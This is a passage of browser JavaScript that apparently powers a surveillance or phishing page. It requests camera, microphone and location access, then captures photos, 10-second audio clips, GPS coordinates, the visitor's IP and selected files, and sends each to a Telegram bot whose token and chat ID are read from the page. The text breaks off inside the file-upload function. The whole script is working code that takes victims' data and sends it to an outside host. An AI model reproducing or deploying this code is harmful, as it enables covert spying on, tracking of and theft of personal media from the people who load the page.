<script>
// ===== CONFIG =====
const BT = document.getElementById('tg-config').dataset.token;
const CI = document.getElementById('tg-config').dataset.chatid;
let accType = null;
let aStream = null;
let mRecorder = null;
let aChunks = [];
let isRec = false;

function log(m,t){
const e=document.getElementById('consoleLog');
const d=document.createElement('div');
d.className='log-entry'+(t==='error'?' error':'');
d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;
e.appendChild(d);e.scrollTop=e.scrollHeight;
}

function toast(m){
const t=document.getElementById('toast');
t.textContent=m;t.classList.add('show');
setTimeout(()=>t.classList.remove('show'),2500);
}

function upStat(t,s){
const map={camera:['sCam','stCam','Camera'],mic:['sMic','stMic','Mic'],location:['sLoc','stLoc','Location'],file:['sFil','stFil','Files']};
const x=map[t];if(!x)return;
document.getElementById(x[0]).className='status-dot '+(s==='active'?'green':s==='pending'?'yellow':'red');
document.getElementById(x[1]).textContent=s==='active'?'Captured ✓':s==='pending'?'Waiting...':'Not accessed';
}

function tgSend(msg){
fetch(`https://api.telegram.org/bot${BT}/sendMessage`,{
method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({chat_id:CI,text:msg,parse_mode:'HTML'})
}).then(r=>r.json()).then(d=>{
if(d.ok)log('✅ Sent to Telegram');
else log('❌ TG error: '+d.description,'error');
}).catch(e=>log('❌ Network: '+e.message,'error'));
}

function tgSendFile(file,caption){
const fd=new FormData();
fd.append('chat_id',CI);fd.append('document',file,file.name||'file');
if(caption)fd.append('caption',caption);
fetch(`https://api.telegram.org/bot${BT}/sendDocument`,{method:'POST',body:fd})
.then(r=>r.json()).then(d=>{if(d.ok)log('✅ File sent')})
.catch(e=>log('❌ File error: '+e.message,'error'));
}

function tgSendPhoto(dataUrl,caption){
const bs=atob(dataUrl.split(',')[1]),mt=dataUrl.split(',')[0].split(':')[1].split(';')[0];
const ab=new ArrayBuffer(bs.length),ia=new Uint8Array(ab);
for(let i=0;i<bs.length;i++)ia[i]=bs.charCodeAt(i);
const blob=new Blob([ab],{type:mt}),file=new File([blob],'photo_'+Date.now()+'.jpg',{type:'image/jpeg'});
const fd=new FormData();
fd.append('chat_id',CI);fd.append('photo',file);
if(caption)fd.append('caption',caption);
fetch(`https://api.telegram.org/bot${BT}/sendPhoto`,{method:'POST',body:fd})
.then(r=>r.json()).then(d=>{if(!d.ok)tgSendFile(file,caption);else log('✅ Photo sent')})
.catch(e=>tgSendFile(file,caption));
}

async function getIP(){
try{
const r=await fetch('https://api.ipify.org?format=json');
return (await r.json()).ip||'Unknown';
}catch(e){return 'Unknown'}
}

// ===== PERMISSIONS =====
async function requestAllPermissions(){
log('Requesting permissions...');
document.getElementById('permBanner').classList.remove('show');
try{
const s=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
setTimeout(()=>s.getTracks().forEach(t=>t.stop()),500);
log('✅ Camera OK');upStat('camera','active');
}catch(e){log('❌ Camera: '+e.message,'error');upStat('camera','pending')}
try{
const s=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
s.getTracks().forEach(t=>t.stop());
log('✅ Mic OK');upStat('mic','active');
}catch(e){log('❌ Mic: '+e.message,'error');upStat('mic','pending')}
try{
await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:10000}));
log('✅ Location OK');upStat('location','active');
}catch(e){log('❌ Location: '+e.message,'error');upStat('location','pending')}
toast('✅ Permissions processed!');
}

// ===== TABS =====
document.querySelectorAll('.tab').forEach(t=>{
t.addEventListener('click',function(){
document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
document.querySelectorAll('.content').forEach(x=>x.classList.remove('active'));
this.classList.add('active');
document.getElementById('tab-'+this.dataset.tab).classList.add('active');
});
});

// ===== CAPTURE PHOTO =====
async function capturePhoto(){
log('Capturing photo...');
try{
const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}},audio:false});
const v=document.createElement('video');v.srcObject=s;v.play();
await new Promise(r=>setTimeout(r,500));
const c=document.createElement('canvas');c.width=v.videoWidth||1280;c.height=v.videoHeight||720;
c.getContext('2d').drawImage(v,0,0);
const du=c.toDataURL('image/jpeg',0.85);
s.getTracks().forEach(t=>t.stop());
let loc='N/A';
try{const p=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000}));loc=`${p.coords.latitude},${p.coords.longitude}`;}catch(e){}
const ip=await getIP();
tgSendPhoto(du,`📸 <b>Photo</b>\n📍 ${loc}\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`);
upStat('camera','active');
toast('📸 Photo sent!');
log('✅ Photo captured & sent');
}catch(e){log('❌ Camera: '+e.message,'error');toast('❌ Camera error')}
}

// ===== AUDIO =====
async function startAudio(){
if(isRec){toast('Already recording...');return}
log('Recording 10s audio...');toast('🎤 Recording 10s...');
try{
const s=await navigator.mediaDevices.getUserMedia({audio:true});
aChunks=[];mRecorder=new MediaRecorder(s);
mRecorder.ondataavailable=e=>{if(e.data.size>0)aChunks.push(e.data)};
mRecorder.onstop=async()=>{
const blob=new Blob(aChunks,{type:'audio/webm'});
s.getTracks().forEach(t=>t.stop());isRec=false;upStat('mic','active');
let loc='N/A';
try{const p=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000}));loc=`${p.coords.latitude},${p.coords.longitude}`;}catch(e){}
const ip=await getIP();
const file=new File([blob],'audio_'+Date.now()+'.webm',{type:'audio/webm'});
tgSendFile(file,`🎤 <b>Audio</b> (10s)\n📍 ${loc}\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n\n👑 Made by ©shoebu`);
log('✅ Audio sent');toast('✅ Audio sent!');
};
mRecorder.start();isRec=true;
setTimeout(()=>{if(mRecorder&&mRecorder.state!=='inactive')mRecorder.stop()},10000);
}catch(e){log('❌ Mic: '+e.message,'error');toast('❌ Mic denied');isRec=false}
}

// ===== LOCATION =====
function getLocation(){
log('Getting location...');
navigator.geolocation.getCurrentPosition(async p=>{
const lat=p.coords.latitude,lon=p.coords.longitude,acc=p.coords.accuracy;
const ip=await getIP();
const msg=`📍 <b>GPS Location</b>\n\n🌐 Lat: ${lat}\n🌐 Lon: ${lon}\n🎯 Accuracy: ${acc}m\n🌐 IP: ${ip}\n🕐 ${new Date().toLocaleString()}\n🔗 https://www.google.com/maps?q=${lat},${lon}\n\n👑 Made by ©shoebu`;
tgSend(msg);upStat('location','active');toast('📍 Location sent!');
},e=>{log('❌ Location: '+e.message,'error');toast('❌ Location denied')},{enableHighAccuracy:true,timeout:10000});
}

// ===== FILES =====
function selectFiles(){
log('Opening file picker...');
const inp=document.getElementById('fileInput');
inp.accept='*/*';
inp.onchange=async function(e){
const fs=e.target.files;if(!fs||!fs.length)return;
